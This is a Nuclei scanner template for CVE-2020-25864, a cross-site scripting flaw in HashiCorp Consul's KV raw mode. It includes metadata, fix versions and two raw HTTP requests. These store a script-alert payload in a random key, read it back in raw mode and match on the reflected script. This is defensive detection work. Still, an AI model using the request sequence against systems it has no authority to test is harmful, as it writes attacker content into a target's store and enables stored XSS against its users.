id: CVE-2020-25864

info:
  name: HashiCorp Consul/Consul Enterprise <=1.9.4 - Cross-Site Scripting
  author: c-sh0
  severity: medium
  description: |
    HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable to cross-site scripting via the key-value (KV) raw mode.
  remediation: Fixed in 1.9.5, 1.8.10 and 1.7.14.
  reference:
    - https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368
    - https://www.hashicorp.com/blog/category/consul
    - https://nvd.nist.gov/vuln/detail/CVE-2020-25864
    - https://security.gentoo.org/glsa/202208-09
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-25864
    cwe-id: CWE-79
    epss-score: 0.00255
    epss-percentile: 0.63075
    cpe: cpe:2.3:a:hashicorp:consul:*:*:*:*:-:*:*:*
  metadata:
    max-request: 2
    vendor: hashicorp
    product: consul
  tags: cve,cve2020,consul,xss,intrusive

http:
  - raw:
      - |
        PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
        Host: {{Hostname}}

        <!DOCTYPE html><script>alert(document.domain)</script>
      - |
        GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
        Host: {{Hostname}}

    req-condition: true

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - text/html

      - type: word
        part: body_2
        words:
          - <!DOCTYPE html><script>alert(document.domain)</script>

      - type: status
        status:
          - 200
# digest: 4a0a004730450221009a1c5a8fc663ace84fd89da13a99852672df7e77bf66ed1b1cd68097624be74202201cf0d7ce51f3c1a82aad37384d35efb60de84a4e52f6c539aa331ad114eaba54:922c64590222798bb761d5b6d8e72950